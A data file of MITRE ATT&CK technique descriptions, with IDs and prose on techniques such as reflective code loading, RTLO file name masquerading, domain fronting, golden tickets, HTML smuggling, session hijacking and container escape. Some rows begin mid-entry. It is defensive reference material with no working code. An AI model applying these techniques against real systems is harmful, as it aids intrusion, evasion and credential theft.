Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information  or  Search Open Websites/Domains ), establishing operational resources (ex:  Acquire Infrastructure  or  Compromise Infrastructure ), and/or initial access (ex:  External Remote Services  or  Trusted Relationship ).",Description
T1091,Replication Through Removable Media,"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.   Mobile devices may also be used to infect PCs with malware if connected via USB.   [1]    This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.   [2]      [3]    For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive.

T1620,Reflective Code Loading,"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).   [1]      [2]      [3]      [4]      [5]      Reflective code injection is very similar to  Process Injection  except that the ""injection"" loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.

A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.   [1]    Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.   [2]    Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.   [3]    With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale  Phishing  or Distributed Denial of Service (DDoS).",Description

T1059.007,Command and Scripting Interpreter: JavaScript,"Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.   [1]      JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the  Component Object Model  and Internet Explorer HTML Application (HTA) pages.   [2]      [3]      [4]      JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and  AppleScript . Scripts can be executed via the command line utility  osascript , they can be compiled into applications or script files via  osacompile , and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.   [5]      [6]      [7]      [8]      [9]      Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a  Drive-by Compromise  or downloading and executing these script files as secondary payloads.

T1036.002,Masquerading: Right-to-Left Override,"Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named  March 25 \u202Excod.scr  will display as  March 25 rcs.docx . A JavaScript file named  photo_high_re\u202Egnp.js  will be displayed as  photo_high_resj.png .   [1]      Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with  Spearphishing Attachment / Malicious File  since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.

T1090.004,Proxy: Domain Fronting,"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.    [1]    Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).   For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",Description

T1185,Browser Session Hijacking,"Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.   [1]      A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.   [2]      [3]    Executing browser-based behaviors such as pivoting may require specific process permissions, such as  SeDebugPrivilege  and/or high-integrity/administrator rights.   Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as  Sharepoint  or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.   [4]",Description

T1498,Network Denial of Service,"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes   [1]    and to support other malicious activities, including distraction   [2]   , hacktivism, and extortion.   [3]      A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).   To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.   Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.   For DoS attacks targeting the hosting system directly, see  Endpoint Denial of Service .",Description

T1055.013,Process Injection: Process Doppelgänging,"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process.    Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.    [1]    To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.    [2]    To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.    [3]      Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.    [4]      Adversaries may abuse TxF to a perform a file-less variation of  Process Injection . Similar to  Process Hollowing , process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as  NtUnmapViewOfSection ,  VirtualProtectEx , and  SetThreadContext .    [4]      Process Doppelgänging is implemented in 4 steps    [4]   :   This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.",Description

T1036.006,Masquerading: Space after Filename,"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.   For example, if there is a Mach-O executable file called  evil.bin , when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to  evil.txt , then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to  evil.txt   (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed    [1]   .   Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",Description

T1568,Dynamic Resolution,"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.   Adversaries may use dynamic resolution for the purpose of  Fallback Channels . When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.   [1]      [2]      [3]",Description

T1565,Data Manipulation,"Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.   The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",Description
T1499.002,Endpoint Denial of Service: Service Exhaustion Flood,"Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.   [1]    Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.   One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.   [2]      Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.   [3]",Description
T1222.002,File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.   [1]      [2]    File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).   Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs:  chown  (short for change owner), and  chmod  (short for change mode).   Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via  Unix Shell Configuration Modification  or tainting/hijacking other instrumental binary/configuration files via  Hijack Execution Flow .

T1053.005,Scheduled Task or Job: Scheduled Task,"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The  schtasks  utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.   The deprecated  at  utility could also be abused by adversaries (ex:  At ), though  at.exe  can not access tasks created with  schtasks  or the Control Panel.   An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to  System Binary Proxy Execution , adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.   [1]      Adversaries may also create ""hidden"" scheduled tasks (i.e.  Hide Artifacts ) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from  schtasks /query  and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).   [2]      [3]    Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g.,  Index  value) within associated registry keys.   [4]",Description

T1495,Firmware Corruption,"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.   [1]    Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.   In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.   [2]      [3]    Depending on the device, this attack may also result in  Data Destruction .",Description

T1611,Escape to Host,"Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.   [1]      There are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as  unshare  and  keyctl  to escalate privileges and steal secrets.   [2]      [3]      [4]      [5]      [6]      [7]      Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as  docker.sock , to break out of the container via a  Container Administration Command .   [5]    Adversaries may also escape via  Exploitation for Privilege Escalation , such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.   [8]      Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.",Description

T1558.001,Steal or Forge Kerberos Tickets: Golden Ticket,"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.   [1]    Golden tickets enable adversaries to generate authentication material for any account in Active Directory.   [2]       Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.   [3]      The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.   [4]    The KRBTGT password hash may be obtained using  OS Credential Dumping  and privileged access to a domain controller.",Description

T1505.005,Server Software Component: Terminal Services DLL,"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.   [1]       Windows Service s that are run as a ""generic"" process (ex:  svchost.exe ) load the service's DLL file, the location of which is stored in a Registry entry named  ServiceDll .   [2]    The  termsrv.dll  file, typically stored in  %SystemRoot%\System32\ , is the default  ServiceDll  value for Terminal Services in  HKLM\System\CurrentControlSet\services\TermService\Parameters\ .   Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.   [3]    Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal  termsrv.dll  functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent  Remote Desktop Protocol  sessions by either patching the  termsrv.dll  file or modifying the  ServiceDll  value to point to a DLL that provides increased RDP functionality.   [4]      [5]    On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",Description
T1055.014,Process Injection: VDSO Hijacking,"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process.    VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via  Ptrace System Calls . However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).   [1]      [2]      [3]      [4]      Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.",Description
T1539,Steal Web Session Cookie,"An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.   Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.   [1]      There are several examples of malware targeting cookies from web browsers on the local system.   [2]      [3]    There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy (ex:  Adversary-in-the-Middle ) that can be set up by an adversary and used in phishing campaigns.   [4]      [5]      After an adversary acquires a valid cookie, they can then perform a  Web Session Cookie  technique to login to the corresponding web application.",Description

T1566,Phishing,"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.   Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.",Description

Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via  Upload Malware , and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.   [1]      Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex:  Match Legitimate Name or Location ).

T1114.001,Email Collection: Local Email Collection,"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.   Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.   [1]    IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files.

T1562.006,Impair Defenses: Indicator Blocking,"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting    [1]    or even disabling host-based sensors, such as Event Tracing for Windows (ETW),   [2]    by tampering settings that control the collection and flow of event telemetry.    [3]    These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as  PowerShell  or  Windows Management Instrumentation .   ETW interruption can be achieved multiple ways, however most directly by defining conditions using the  PowerShell   Set-EtwTraceProvider  cmdlet or by interfacing directly with the Registry to make alterations.   In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.   In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors    [4]   .",Description

T1027.006,Obfuscated Files or Information: HTML Smuggling,"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.   [1]      [2]      Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as  text/plain  and/or  text/html . Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e.  Deobfuscate/Decode Files or Information ), potentially bypassing content filters.

T1649,Steal or Forge Authentication Certificates,"Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.   [1]      [2]      Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files), misplaced certificate files (i.e.  Unsecured Credentials ), or directly from the Windows certificate store via various crypto APIs.   [3]      [4]      [5]    With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.   [6]      Abusing certificates for authentication credentials may enable other behaviors such as  Lateral Movement . Certificate-related misconfigurations may also enable opportunities for  Privilege Escalation , by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable  Persistence  via stealing or forging certificates that can be used as  Valid Accounts  for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.   Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish  Persistence  by forging arbitrary authentication certificates for the victim domain (known as ""golden"" certificates).   [6]    Adversaries may also target certificates and related services in order to access other forms of credentials, such as  Golden Ticket  ticket-granting tickets (TGT) or NTLM plaintext.

Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.   Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex:  Social Media  or  Search Victim-Owned Websites ).   [1]      [2]    Email addresses could also be enumerated via more active means (i.e.  Active Scanning ), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.   [3]    For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.   [4]      [5]      Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains  or  Phishing for Information ), establishing operational resources (ex:  Email Accounts ), and/or initial access (ex:  Phishing  or  Brute Force  via  External Remote Services ).",Description

T1027.007,Obfuscated Files or Information: Dynamic API Resolution,"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various  Native API  functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.   API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.   [1]      [2]      To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to  Software Packing , dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.   Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as  GetProcAddress()  and  LoadLibrary() . These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of  Deobfuscate/Decode Files or Information  during execution).

T1557,Adversary-in-the-Middle,"Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as  Network Sniffing  or  Transmitted Data Manipulation . By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.   [1]      For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.   [2]      [3]      [4]    Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials and session cookies.   [5]     Downgrade Attack s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.   [6]      [7]      [8]      Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in  Transmitted Data Manipulation . Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to  Impair Defenses  and/or in support of a  Network Denial of Service .",Description

T1557,Adversary-in-the-Middle,Kimsuky  has used modified versions of PHProxy to examine web traffic between the victim and the accessed website.   [11],Procedure Examples
T1212,Exploitation for Credential Access,"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.   [1]      [2]    Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",Description
T1588,Obtain Capabilities,"Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.   In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.   [1]      [2]      In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.   [3]",Description
T1137.005,Office Application Startup: Outlook Rules,"Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.   [1]      Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.   [1]",Description
